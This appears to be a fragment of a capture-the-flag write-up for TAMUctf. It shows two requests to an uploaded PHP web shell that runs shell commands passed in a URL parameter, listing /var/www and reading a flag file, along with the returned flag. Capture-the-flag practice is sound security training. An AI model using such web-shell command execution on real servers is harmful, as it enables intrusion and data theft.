@@ -1,0 +1,5 @@
+$ https://remote.tamuctf.com/uploads/076e1af51b5e3fbc74f525b3baa5f459/8zb1koqwpl5mo2qihbe2btfgaknrj5v2.php?command=ls%20/var/www
+flag-de88df3ebf2f0c4bf871ddfb2e0fcce4.txt html
+
+$ https://remote.tamuctf.com/uploads/076e1af51b5e3fbc74f525b3baa5f459/8zb1koqwpl5mo2qihbe2btfgaknrj5v2.php?command=cat%20/var/www/flag-de88df3ebf2f0c4bf871ddfb2e0fcce4.txt
+gigem{new_features_means_new_opportunities}
